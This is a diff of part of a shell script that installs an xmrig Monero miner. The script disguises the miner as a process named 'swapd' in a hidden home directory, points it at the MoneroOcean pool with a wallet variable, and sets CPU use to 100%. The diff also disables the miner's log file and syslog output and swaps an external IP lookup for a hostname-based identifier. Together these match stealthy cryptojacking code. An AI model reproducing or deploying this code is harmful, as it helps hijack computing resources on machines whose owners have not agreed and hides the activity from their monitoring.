@@ -240,9 +240,9 @@ echo "[*] Miner $HOME/.swapd/xmrig is OK"
 
 mv $HOME/.swapd/xmrig $HOME/.swapd/swapd
 
-#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 #PASS=`hostname`
-PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
+#PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
 if [ "$PASS" == "localhost" ]; then
   PASS=`ip route get 1 | awk '{print $NF;exit}'`
 fi
@@ -257,9 +257,8 @@ sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.sw
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.swapd/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.swapd/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.swapd/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/swapd.log'",#' $HOME/.swapd/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.swapd/config.json
-sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.swapd/config.json
+#sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/swapd.log'",#' $HOME/.swapd/config.json
+#sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.swapd/config.json
 sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.swapd/config.json
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.swapd/config.json
 sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.swapd/config.json
